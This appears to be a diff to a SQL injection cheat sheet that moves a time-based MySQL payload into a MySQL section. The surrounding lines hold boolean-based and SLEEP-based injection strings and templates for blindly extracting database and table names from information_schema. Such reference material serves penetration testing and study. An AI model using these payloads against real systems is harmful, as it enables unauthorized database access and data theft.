@@ -562,9 +562,6 @@ reference: [https://portswigger.net/web-security/sql-injection/examining-the-dat
 -- boolean-based SQLi
 ' AND 1=1 -- //
 
--- time-based SQLi
-' AND IF (1=1, sleep(3),'false') -- //
-
 if((select count(*) from information_schema.tables where table_schema='{DBNAME}') = 1, 1, 0) # check exist dbname
 LENGTH((select table_name from information_schema.tables where table_schema='{DBNAME}'))={i} # examining dbname length
 SUBSTRING((select table_name from information_schema.tables where table_schema='{DBNAME}'),{i},1)='{word}' # examining table name
@@ -590,6 +587,7 @@ if (@@VERSION)=9 select 1 else select 2;
 
 ~~~ sql
 -- MySQL
+' AND IF (1=1, sleep(3),'false') -- //
 ' OR IF(1=1, SLEEP(5), 0)--+
 ' AND IF(ASCII(SUBSTRING(user(),1,1))=114, SLEEP(5), 0)--+
 
